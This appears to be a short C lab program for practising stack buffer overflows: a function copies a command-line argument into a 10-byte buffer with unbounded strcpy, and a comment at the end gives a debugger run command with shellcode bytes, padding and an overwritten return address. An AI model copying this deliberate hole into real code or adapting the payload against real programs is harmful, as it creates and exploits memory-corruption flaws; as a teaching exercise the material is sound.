#include <string.h>
#include <stdio.h>


void vulnerable_copy(char* input)
{
    char buf[10];
    strcpy(buf, input);
}

void never_print()
{
    printf("Secret Secret, Naughty Naughty.\n");
}

int main(int argc, char** argv)
{
    int value = 100;
    vulnerable_copy(argv[1]);
    value = 700;

    return 0;
}


/*
 *
 * r $(python -c 'print
 * "\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80" 
 * + "\x90"*12 + "\x56\x84\x04\x08"')
 *
 */